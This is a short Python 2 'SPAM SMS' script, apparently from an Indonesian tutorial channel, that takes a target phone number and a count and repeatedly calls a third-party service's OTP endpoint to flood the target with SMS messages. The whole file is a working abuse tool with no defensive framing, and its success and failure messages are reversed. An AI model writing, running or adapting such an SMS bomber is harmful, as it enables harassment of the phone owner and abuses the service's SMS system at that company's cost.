
        # coding:utf8

# TUTORIAL : Kingtebe
# YOUTUBE  : Black-IT
# GITHUB   : https://github.com/KINGTEBE-404
# Python   : 2.7

import os,sys,json,time

try:
# Dimana Module requests belom di install
   import requests
except ImportError:
   print("\n [!] Silahkan install module requests")
   print("     ketik : pip2 install requests\n")
   sys.exit()


os.system('clear')

# banner
logo = """

        </> SPAM•SMS <\>

 [•] Author : roy
 [•] Youtub : Black-IT
 [•] Github : https://github.com/KINGTEBE-404
‹---------------------------------------------›
"""

print(logo)
# Penginputan Nomor Target
target = raw_input(" [•] Target : ")
# Penginputan Jumlah Spam
jumlah = raw_input(" [•] Jumlah : ")
print('')

req = requests.Session()

# Web Api Harnic.ID
url = "https://api.harnicid.com/phone_auth_OTP"

for i in range(int(jumlah)):
        respon = req.post(url,data={'phone':target}).text
        status = json.loads(respon)['message']
        if status == 'OTP sent':
                print(" Sent To "+ target +" Failed")
                # Jeda Waktu / Seccond
                time.sleep(2)
        else:
                print(" Sent To "+ target +" Succses")
                # Jeda Waktu / Seccond
                time.sleep(2)
